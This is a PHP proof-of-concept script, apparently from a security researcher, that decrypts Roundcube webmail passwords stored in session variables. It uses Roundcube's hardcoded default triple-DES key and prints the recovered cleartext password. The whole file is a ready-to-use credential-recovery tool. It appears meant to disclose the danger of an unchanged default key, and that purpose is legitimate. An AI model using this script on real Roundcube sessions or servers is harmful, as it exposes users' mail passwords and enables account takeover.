<?php

echo "
###################################################################
#
# Roundcube password decrypt from session-vars POC
# by Renato Brescia (KCD)
#
##################################################################
";

#### PROGRAM DATA ####
$cipher="YOUR-PASSWORD-HERE";                 #encrypted password
$ckey="rcmail-!24ByteDESkey*Str";             #DES key
$method="DES-EDE3-CBC";                       #cipher method
$base64=true;                                 #base64 flag
#### PROGRAM DATA ####


if (!is_string($cipher) || !strlen($cipher)) {
    die("Input error");
}

if ($base64) {
    $cipher = base64_decode($cipher);
    if ($cipher === false) {
        die("base64 decoding error");
    }
}

$iv_size = openssl_cipher_iv_length($method);
$tag     = null;

if (preg_match('/^##(.{16})##/s', $cipher, $matches)) {
    $tag    = $matches[1];
    $cipher = substr($cipher, strlen($matches[0]));
}

$iv = substr($cipher, 0, $iv_size);

// session corruption? (#1485970)
if (strlen($iv) < $iv_size) {
    return false;
}

$cipher = substr($cipher, $iv_size);
$clear  = openssl_decrypt($cipher, $method, $ckey, OPENSSL_RAW_DATA, $iv, $tag);

echo "CLEAR PASSWORD: ".$clear."\n";
 ?>
